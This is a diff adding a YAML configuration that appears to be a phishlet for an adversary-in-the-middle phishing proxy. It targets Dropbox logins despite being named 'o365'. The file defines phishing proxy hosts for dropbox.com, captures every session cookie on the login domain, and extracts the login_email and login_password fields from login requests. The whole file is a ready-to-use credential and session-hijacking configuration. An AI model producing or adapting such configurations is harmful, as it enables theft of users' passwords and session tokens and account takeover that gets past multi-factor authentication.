@@ -1,0 +1,27 @@
+name: 'o365'
+author: '@NOIR'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing:true }
+  - {phish_sub: '', orig_sub: '', domain: 'dropbox.com', session: false, is_landing:false }
+  - {phish_sub: 'bolt', orig_sub: 'bolt', domain: 'bolt.dropbox.com', session: false, is_landing:false }
+sub_filters: []
+
+auth_urls:
+  - 'home'
+
+auth_tokens:
+  - domain: '.www.dropbox.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: '(login_email)'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"login_password":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'www.dropbox.com'
+  path: '/login'
